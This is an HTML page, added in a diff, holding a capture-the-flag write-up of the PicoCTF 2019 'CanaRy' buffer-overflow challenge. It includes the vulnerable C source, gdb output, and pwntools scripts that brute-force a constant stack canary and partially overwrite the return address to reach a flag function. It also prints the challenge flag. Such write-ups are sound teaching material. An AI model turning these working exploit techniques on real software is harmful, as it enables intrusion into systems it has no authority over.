@@ -1,0 +1,295 @@
+<!doctype html><html lang=en class="sidebar-visible no-js ayu"><meta charset=utf-8><title>PicoCTF19 CanaRy - Capture The Flag</title><meta charset=utf-8><meta name=description content><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#ffffff"><link rel="shortcut icon" href=../../favicon.png><link rel=stylesheet href=../../css/variables.css><link rel=stylesheet href=../../css/general.css><link rel=stylesheet href=../../css/chrome.css><link rel=stylesheet href=../../css/print.css media=print><link rel=stylesheet href=../../FontAwesome/css/font-awesome.css><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel=stylesheet><link rel=stylesheet href=../../highlight.css><link rel=stylesheet href=../../tomorrow-night.css><link rel=stylesheet href=../../ayu-highlight.css><link rel=stylesheet href=../../theme/mermaid.css><script>var path_to_root="../../";var default_theme=window.matchMedia("(prefers-color-scheme: dark)").matches?"ayu":"ayu";</script><script>try{var theme=localStorage.getItem('mdbook-theme');var sidebar=localStorage.getItem('mdbook-sidebar');if(theme.startsWith('"')&&theme.endsWith('"')){localStorage.setItem('mdbook-theme',theme.slice(1,theme.length-1));}
+if(sidebar.startsWith('"')&&sidebar.endsWith('"')){localStorage.setItem('mdbook-sidebar',sidebar.slice(1,sidebar.length-1));}}catch(e){}</script><script>var theme;try{theme=localStorage.getItem('mdbook-theme');}catch(e){}
+if(theme===null||theme===undefined){theme=default_theme;}
+var html=document.querySelector('html');html.classList.remove('no-js')
+html.classList.remove('ayu')
+html.classList.add(theme);html.classList.add('js');</script><script>var html=document.querySelector('html');var sidebar='hidden';if(document.body.clientWidth>=1080){try{sidebar=localStorage.getItem('mdbook-sidebar');}catch(e){}
+sidebar=sidebar||'visible';}
+html.classList.remove('sidebar-visible');html.classList.add("sidebar-"+sidebar);</script><nav id=sidebar class=sidebar aria-label="Table of contents"><div class=sidebar-scrollbox><ol class=chapter><li class="chapter-item expanded"><a href=../../index.html><strong aria-hidden=true>1.</strong> Introduction</a><li class="chapter-item expanded"><a href=../../MISCELLANEOUS.html><strong aria-hidden=true>2.</strong> Miscellaneous</a><li class="chapter-item expanded"><a href=../../ctf/index.html><strong aria-hidden=true>3.</strong> Capture The Flag</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/binary/index.html><strong aria-hidden=true>3.1.</strong> Binary Exploitation</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-handy_shellcode.html><strong aria-hidden=true>3.1.1.</strong> PicoCTF19 Handy Shellcode</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-overflow_0.html><strong aria-hidden=true>3.1.2.</strong> PicoCTF19 OverFlow 0</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-overflow_1.html><strong aria-hidden=true>3.1.3.</strong> PicoCTF19 OverFlow 1</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-overflow_2.html><strong aria-hidden=true>3.1.4.</strong> PicoCTF19 OverFlow 2</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-new_overflow_1.html><strong aria-hidden=true>3.1.5.</strong> PicoCTF19 NewOverFlow 1</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-new_overflow_2.html><strong aria-hidden=true>3.1.6.</strong> PicoCTF19 NewOverFlow 2</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-slippery_shellcode.html><strong aria-hidden=true>3.1.7.</strong> PicoCTF19 Slip-Shellcode</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-stringzz.html><strong aria-hidden=true>3.1.8.</strong> PicoCTF19 Stringzz</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf18-learn_libc.html><strong aria-hidden=true>3.1.9.</strong> PicoCTF18 learn-libc</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-rop32.html><strong aria-hidden=true>3.1.10.</strong> PicoCTF19 rop32</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-rop64.html><strong aria-hidden=true>3.1.11.</strong> PicoCTF19 rop64</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-leap_frog.html><strong aria-hidden=true>3.1.12.</strong> PicoCTF19 leap-frog</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-canary.html class=active><strong aria-hidden=true>3.1.13.</strong> PicoCTF19 CanaRy</a></ol><li class="chapter-item expanded"><a href=../../ctf/crypto/index.html><strong aria-hidden=true>3.2.</strong> Crypto</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/crypto/hackcon18-caesar.html><strong aria-hidden=true>3.2.1.</strong> Hackcon2018 Caesar Salad</a><li class="chapter-item expanded"><a href=../../ctf/crypto/hackcon18-salad.html><strong aria-hidden=true>3.2.2.</strong> Hackcon2018 Salad Up.</a><li class="chapter-item expanded"><a href=../../ctf/crypto/icectf18q-garfield.html><strong aria-hidden=true>3.2.3.</strong> IceCTF18Q Garfield</a><li class="chapter-item expanded"><a href=../../ctf/crypto/tjctf18-classic.html><strong aria-hidden=true>3.2.4.</strong> TJCTF18 Classic</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-numbers.html><strong aria-hidden=true>3.2.5.</strong> PicoCTF19 The Numbers</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-caesar.html><strong aria-hidden=true>3.2.6.</strong> PicoCTF19 Caesar</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-wavesoverlambda.html><strong aria-hidden=true>3.2.7.</strong> PicoCTF19 Waves Lambda</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-lacifrede.html><strong aria-hidden=true>3.2.8.</strong> PicoCTF19 La Cifra De</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-rsapopquiz.html><strong aria-hidden=true>3.2.9.</strong> PicoCTF19 RSA Pop Quiz</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-minirsa.html><strong aria-hidden=true>3.2.10.</strong> PicoCTF19 miniRSA</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-b00tl3gRSA2.html><strong aria-hidden=true>3.2.11.</strong> PicoCTF19 b00tl3gRSA2</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-b00tl3gRSA3.html><strong aria-hidden=true>3.2.12.</strong> PicoCTF19 b00tl3gRSA3</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-john_pollard.html><strong aria-hidden=true>3.2.13.</strong> PicoCTF19 john_pollard</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-aesabc.html><strong aria-hidden=true>3.2.14.</strong> PicoCTF19 AES-ABC</a><li class="chapter-item expanded"><a href=../../ctf/crypto/auctf20-extraordinary.html><strong aria-hidden=true>3.2.15.</strong> AUCTF20 Extraordinary</a></ol><li class="chapter-item expanded"><a href=../../ctf/forensics/index.html><strong aria-hidden=true>3.3.</strong> Forensics</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/forensics/aeroctf20-drawings.html><strong aria-hidden=true>3.3.1.</strong> AeroCTF20 Drawings</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-garden.html><strong aria-hidden=true>3.3.2.</strong> PicoCTF19 Garden</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-unzip.html><strong aria-hidden=true>3.3.3.</strong> PicoCTF19 Unzip</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-so-meta.html><strong aria-hidden=true>3.3.4.</strong> PicoCTF19 So Meta</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-what-lies-within.html><strong aria-hidden=true>3.3.5.</strong> PicoCTF19 Lies Within</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-extensions.html><strong aria-hidden=true>3.3.6.</strong> PicoCTF19 Extensions</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-shark-on-wire-1.html><strong aria-hidden=true>3.3.7.</strong> PicoCTF19 Shark Wire</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-whitepages.html><strong aria-hidden=true>3.3.8.</strong> PicoCTF19 WhitePages</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-like1000.html><strong aria-hidden=true>3.3.9.</strong> PicoCTF19 like1000</a></ol><li class="chapter-item expanded"><a href=../../ctf/misc/index.html><strong aria-hidden=true>3.4.</strong> Misc</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/misc/auctf20-bash.html><strong aria-hidden=true>3.4.1.</strong> AUCTF20 Bash</a><li class="chapter-item expanded"><a href=../../ctf/misc/corelightctf20.html><strong aria-hidden=true>3.4.2.</strong> CorelightCTF20</a></ol><li class="chapter-item expanded"><a href=../../ctf/reversing/index.html><strong aria-hidden=true>3.5.</strong> Reversing</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/reversing/auctf20-mrgame.html><strong aria-hidden=true>3.5.1.</strong> AUCTF20 Mr. Game</a></ol><li class="chapter-item expanded"><a href=../../ctf/web/index.html><strong aria-hidden=true>3.6.</strong> Web</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/web/seccon19-web_search.html><strong aria-hidden=true>3.6.1.</strong> SECCON19 Web Search</a><li class="chapter-item expanded"><a href=../../ctf/web/tmctf19-finals-containers.html><strong aria-hidden=true>3.6.2.</strong> TMCTF19F Container</a><li class="chapter-item expanded"><a href=../../ctf/web/insctf20-quals-lowdeep.html><strong aria-hidden=true>3.6.3.</strong> INSCTF20Q LowDeep</a></ol></ol></ol></div><div id=sidebar-resize-handle class=sidebar-resize-handle></div></nav><div id=page-wrapper class=page-wrapper><div class=page><div id=menu-bar-hover-placeholder></div><div id=menu-bar class="menu-bar sticky bordered"><div class=left-buttons><button id=sidebar-toggle class=icon-button type=button title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls=sidebar>
+<i class="fa fa-bars"></i></button>
+<button id=theme-toggle class=icon-button type=button title="Change theme" aria-label="Change theme" aria-haspopup=true aria-expanded=false aria-controls=theme-list>
+<i class="fa fa-paint-brush"></i></button><ul id=theme-list class=theme-popup aria-label=Themes role=menu><li role=none><button role=menuitem class=theme id=light>Light</button><li role=none><button role=menuitem class=theme id=rust>Rust</button><li role=none><button role=menuitem class=theme id=coal>Coal</button><li role=none><button role=menuitem class=theme id=navy>Navy</button><li role=none><button role=menuitem class=theme id=ayu>Ayu (default)</button></ul><button id=search-toggle class=icon-button type=button title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded=false aria-keyshortcuts=S aria-controls=searchbar>
+<i class="fa fa-search"></i></button></div><h1 class=menu-title>Capture The Flag</h1><div class=right-buttons><a href=../../print.html title="Print this book" aria-label="Print this book"><i id=print-button class="fa fa-print"></i></a><a href=https://github.com/sgama/ctf.samsongama.com title="Git repository" aria-label="Git repository"><i id=git-repository-button class="fa fa-github"></i></a></div></div><div id=search-wrapper class=hidden><form id=searchbar-outer class=searchbar-outer><input type=search name=search id=searchbar name=searchbar placeholder="Search this book ..." aria-controls=searchresults-outer aria-describedby=searchresults-header></form><div id=searchresults-outer class="searchresults-outer hidden"><div id=searchresults-header class=searchresults-header></div><ul id=searchresults></ul></div></div><script>document.getElementById('sidebar-toggle').setAttribute('aria-expanded',sidebar==='visible');document.getElementById('sidebar').setAttribute('aria-hidden',sidebar!=='visible');Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link){link.setAttribute('tabIndex',sidebar==='visible'?0:-1);});</script><div id=content class=content><main><h1><a class=header href=#picoctf19-canary id=picoctf19-canary>PicoCTF19 CanaRy</a></h1><h2><a class=header href=#challenge id=challenge>Challenge</a></h2><p>This time we added a canary to detect buffer overflows. Can you still find a way to retreive the flag from this <a href=https://2019shell1.picoctf.com/static/6811022be7c0f9b08826d5cdcc20a2bf/vuln>program</a> located in /problems/canary_3. <a href=https://2019shell1.picoctf.com/static/6811022be7c0f9b08826d5cdcc20a2bf/vuln.c>Source</a>.<h2><a class=header href=#hints id=hints>Hints</a></h2><p>Maybe there's a smart way to brute-force the canary?<h2><a class=header href=#solution id=solution>Solution</a></h2><p>In this question, we have an additional file in our directory:<pre><code>samson@pico-2019-shell1:/problems/canary_3$ ls -al
+total 96
+drwxr-xr-x   2 root       root        4096 Sep 28  2019 .
+drwxr-x--x 684 root       root       69632 Oct 10  2019 ..
+-r--r-----   1 hacksports canary_3       5 Sep 28  2019 canary.txt
+-r--r-----   1 hacksports canary_3      42 Sep 28  2019 flag.txt
+-rwxr-sr-x   1 hacksports canary_3    7744 Sep 28  2019 vuln
+-rw-rw-r--   1 hacksports hacksports  1469 Sep 28  2019 vuln.c
+</code></pre><p>Here's the file<pre><code class=language-c>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;wchar.h&gt;
+#include &lt;locale.h&gt;
+
+#define BUF_SIZE 32
+#define FLAG_LEN 64
+#define KEY_LEN 4
+
+void display_flag() {
+  char buf[FLAG_LEN];
+  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
+  if (f == NULL) {
+    printf(&quot;'flag.txt' missing in the current directory!\n&quot;);
+    exit(0);
+  }
+  fgets(buf,FLAG_LEN,f);
+  puts(buf);
+  fflush(stdout);
+}
+
+char key[KEY_LEN];
+void read_canary() {
+  FILE *f = fopen(&quot;/problems/canary_3/canary.txt&quot;,&quot;r&quot;);
+  if (f == NULL) {
+    printf(&quot;[ERROR]: Trying to Read Canary\n&quot;);
+    exit(0);
+  }
+  fread(key,sizeof(char),KEY_LEN,f);
+  fclose(f);
+}
+
+void vuln(){
+   char canary[KEY_LEN];
+   char buf[BUF_SIZE];
+   char user_len[BUF_SIZE];
+
+   int count;
+   int x = 0;
+   memcpy(canary,key,KEY_LEN);
+   printf(&quot;Please enter the length of the entry:\n&gt; &quot;);
+
+   while (x&lt;BUF_SIZE) {
+      read(0,user_len+x,1);
+      if (user_len[x]=='\n') break;
+      x++;
+   }
+   sscanf(user_len,&quot;%d&quot;,&amp;count);
+
+   printf(&quot;Input&gt; &quot;);
+   read(0,buf,count);
+
+   if (memcmp(canary,key,KEY_LEN)) {
+      printf(&quot;*** Stack Smashing Detected *** : Canary Value Corrupt!\n&quot;);
+      exit(-1);
+   }
+   printf(&quot;Ok... Now Where's the Flag?\n&quot;);
+   fflush(stdout);
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  
+  int i;
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  read_canary();
+  vuln();
+
+  return 0;
+}
+</code></pre><p>Let's also run our sanity checks for protections applied:<pre><code class=language-bash>samson@pico-2019-shell1:/problems/canary_3$ checksec vuln
+[*] '/problems/canary_3/vuln'
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled (ASLR)
+</code></pre><p>For context, a canary is just a value on the stack between local variables and function return addresses.<p>They are used to mitigate against buffer overflow attacks by verifying that this value is always on the stack to verify the stack has not been "smashed" or compromised.<p>This is usually added by the compiler with a flag, but for illustrative purposes the problem seems to implement an application version of the canary.<hr><p>So at the start of the program, it seems the the program loads the canary of size 4 bytes into a global variable of type char.<pre><code>#define KEY_LEN 4
+char key[KEY_LEN];
+void read_canary() {
+  FILE *f = fopen(&quot;/problems/canary_3/canary.txt&quot;,&quot;r&quot;);
+  if (f == NULL) {
+    printf(&quot;[ERROR]: Trying to Read Canary\n&quot;);
+    exit(0);
+  }
+  fread(key,sizeof(char),KEY_LEN,f);
+  fclose(f);
+}
+</code></pre><p>If we were able to read <code>canary.txt</code> (which we can't), we would know what to fill our buffer overflow with, however we don't. On the other hand, due to this function we know it's constant.<p>Fun Fact: Windows XP used to use a constant canary and you could brute-force it byte by byte. This may be the solution here.<pre><code class=language-c>   char canary[KEY_LEN];
+   char buf[BUF_SIZE];
+   char user_len[BUF_SIZE];
+
+   int count;
+   int x = 0;
+   memcpy(canary,key,KEY_LEN);
+   printf(&quot;Please enter the length of the entry:\n&gt; &quot;);
+
+   while (x&lt;BUF_SIZE) {
+      read(0,user_len+x,1);
+      if (user_len[x]=='\n') break;
+      x++;
+   }
+   sscanf(user_len,&quot;%d&quot;,&amp;count);
+</code></pre><p>The program prompts us for the length of the entry, not sure what that is yet. But it reads from user input and places it into a buffer <code>user_len</code>.<p>Then it reads the input we pass it with a vulnerable function, but it reads only the amount we said we'd send it.<p><code>read(0,buf,count);</code><pre><code>samson@pico-2019-shell1:/problems/canary_3$ ./vulnPlease enter the length of the entry:
+&gt; 0
+Input&gt; Ok... Now Where's the Flag?
+samson@pico-2019-shell1:/problems/canary_3$ ./vuln
+Please enter the length of the entry:
+&gt; 1
+Input&gt; 1
+Ok... Now Where's the Flag?
+samson@pico-2019-shell1:/problems/canary_3$ ./vuln
+Please enter the length of the entry:
+&gt; 64
+Input&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+*** Stack Smashing Detected *** : Canary Value Corrupt!
+</code></pre><p>At this point, we sort of know what we have to do. We have to bruteforce the canary which is 4 bytes, then overwrite the first return address with the address of the <code>display_flag()</code> function.<p>We will attempt to attack the canary one value at a time, let's create our python script to do this for us.<pre><code class=language-python>#!/usr/bin/env python
+
+from pwn import *
+
+s = ssh(host = '2019shell1.picoctf.com', user='samson', password='REDACTED')
+
+canary = ''
+while len(canary) &lt; 4: # Only 1024 iterations, possible because of 32bit
+    for i in range(256): # from 00 to FF in each byte
+        p = s.process('/problems/canary_3/vuln')
+        p.sendlineafter('&gt; ', '{}'.format(32 + len(canary) + 1)) # BUF_SIZE + 1 intending to write past canary
+        p.sendlineafter('&gt; ', 'A' * 32 + canary + '{}'.format(chr(i)))
+        l = p.recvline()
+
+        if '*** Stack Smashing Detected' not in str(l):
+            canary += chr(i)
+            log.info('Partial canary: {}'.format(canary))
+            break
+
+        p.close()
+log.info('Found canary: {}'.format(canary))
+</code></pre><pre><code class=language-bash>$ python canary.py 
+...
+[*] Partial canary: 57Gh
+[*] Found canary: 57Gh
+</code></pre><p>Great we have the canary: <code>57Gh</code><p>However, it's not as simple as the usual buffer overflow now. since PIE or ASLR is enabled, the address of <code>display_flag()</code> is randomized.<p>Let's check the value once:<pre><code>samson@pico-2019-shell1:/problems/canary_3$ gdb ./vuln 
+(gdb) b main
+Breakpoint 1 at 0xa14
+(gdb) run
+Starting program: /problems/canary_3/vuln 
+
+Breakpoint 1, 0x56586a14 in main ()
+(gdb) x display_flag
+0x565867ed &lt;display_flag&gt;:      0x53e58955
+-----------------
+samson@pico-2019-shell1:/problems/canary_3$ gdb ./vuln 
+(gdb) x display_flag
+0x7ed &lt;display_flag&gt;:   0x53e58955
+(gdb) b main
+Breakpoint 1 at 0xa14
+(gdb) r
+Starting program: /problems/canary_3/vuln 
+
+Breakpoint 1, 0x565cfa14 in main ()
+(gdb) x display_flag
+0x565cf7ed &lt;display_flag&gt;:      0x53e58955
+</code></pre><p>Interestingly enough, for some reason if you try this over and over again, the addresses seem to repeat. Only 3 bytes.
+Let's brute force it? We can attempt to use one of the addresses and hope there will a chance it'll work.<p>Again, this will only work since we're in 32-bit mode, even more so since only a few of the 32 bits are random.<p>Let's construct our payload:<pre><code>payload = &quot;A&quot;*32 + canary + &quot;A&quot;*16 + &quot;\xed\x07&quot;
+</code></pre><p>We can determine the offset from the canary to the bottom of the stack but looking at the assembly code for the offset to the frame pointer, trail and error with multiples of 4, or even using the pwntools cyclic command.<p>In this case, I'll use GDB for brevity, remember that we're looking for <code>ebp</code> when looking for clues of an offset. 0x10 is 16 bytes.<pre><code>(gdb) disas vuln
+Dump of assembler code for function vuln:
+   0x000008f4 &lt;+0&gt;:     push   %ebp
+   0x000008f5 &lt;+1&gt;:     mov    %esp,%ebp
+   0x000008f7 &lt;+3&gt;:     push   %ebx
+   0x000008f8 &lt;+4&gt;:     sub    $0x54,%esp
+   0x000008fb &lt;+7&gt;:     call   0x6f0 &lt;__x86.get_pc_thunk.bx&gt;
+   0x00000900 &lt;+12&gt;:    add    $0x16a0,%ebx
+   0x00000906 &lt;+18&gt;:    movl   $0x0,-0xc(%ebp)
+   0x0000090d &lt;+25&gt;:    lea    0x6c(%ebx),%eax
+   0x00000913 &lt;+31&gt;:    mov    (%eax),%eax
+   0x00000915 &lt;+33&gt;:    mov    %eax,-0x10(%ebp)    &lt;&lt;&lt;&lt;
+   0x00000918 &lt;+36&gt;:    sub    $0xc,%esp
+   0x0000091b &lt;+39&gt;:    lea    -0x1414(%ebx),%eax
+</code></pre><p>Now we can code our exploit with our known canary:<pre><code class=language-python>#!/usr/bin/env python3
+
+from pwn import *
+
+s = ssh(host = '2019shell1.picoctf.com', user='samson', password='REDACTED')
+s.set_working_directory('/problems/canary_3/')
+canary = &quot;57Gh&quot;
+address_display_flag = 0x565cf7ed
+while True:
+    p = s.process('./vuln')
+    p.sendlineafter('&gt; ', '54') # Size of payload
+    payload = &quot;A&quot;*32 + canary + &quot;A&quot;*16 + &quot;\xed\x07&quot;
+    p.sendlineafter('&gt; ', payload)
+    out = p.recvall()
+    print(out)
+    if &quot;pico&quot; in str(out):
+        print(out)
+        break
+    p.close()
+</code></pre><pre><code>samson@pico-2019-shell1:/problems/canary_3$ python ~/p2.py 
+[+] Connecting to 2019shell1.picoctf.com on port 22: Done
+[!] Couldn't check security settings on '2019shell1.picoctf.com'
+[*] Working directory: '/problems/canary_3/'
+[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174334
+[+] Receiving all data: Done (28B)
+[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174334)
+Ok... Now Where's the Flag?
+
+[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174341
+[+] Receiving all data: Done (28B)
+[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174341)
+Ok... Now Where's the Flag?
+
+[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174348
+[+] Receiving all data: Done (28B)
+[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174348)
+Ok... Now Where's the Flag?
+
+[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174355
+[+] Receiving all data: Done (28B)
+[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174355)
+Ok... Now Where's the Flag?
+
+[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174362
+[+] Receiving all data: Done (28B)
+[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174362)
+Ok... Now Where's the Flag?
+
+[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174369
+[+] Receiving all data: Done (28B)
+[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174369)
+Ok... Now Where's the Flag?
+
+[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174376
+[+] Receiving all data: Done (28B)
+[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174376)
+Ok... Now Where's the Flag?
+
+[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174384
+[+] Receiving all data: Done (28B)
+[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174384)
+Ok... Now Where's the Flag?
+
+[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174391
+[+] Receiving all data: Done (28B)
+[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174391)
+Ok... Now Where's the Flag?
+
+[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174398
+[+] Receiving all data: Done (28B)
+[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174398)
+Ok... Now Where's the Flag?
+
+[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174405
+[+] Receiving all data: Done (28B)
+[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174405)
+Ok... Now Where's the Flag?
+
+[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174412
+[+] Receiving all data: Done (28B)
+[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174412)
+Ok... Now Where's the Flag?
+
+[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174419
+[+] Receiving all data: Done (71B)
+[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174419)
+Ok... Now Where's the Flag?
+picoCTF{cAnAr135_mU5t_b3_r4nd0m!_0bd260ce}
+
+Ok... Now Where's the Flag?
+picoCTF{cAnAr135_mU5t_b3_r4nd0m!_0bd260ce}
+</code></pre><h2><a class=header href=#flag id=flag>Flag</a></h2><p><code>picoCTF{cAnAr135_mU5t_b3_r4nd0m!_0bd260ce}</code></main><nav class=nav-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/binary/picoctf19-leap_frog.html class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a rel=next href=../../ctf/crypto/index.html class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a><div style=clear:both></div></nav></div></div><nav class=nav-wide-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/binary/picoctf19-leap_frog.html class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a rel=next href=../../ctf/crypto/index.html class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a></nav></div><script>window.playpen_copyable=true;</script><script src=../../elasticlunr.min.js></script><script src=../../mark.min.js></script><script src=../../searcher.js></script><script src=../../clipboard.min.js></script><script src=../../highlight.js></script><script src=../../book.js></script><script src=../../theme/mermaid.js></script>
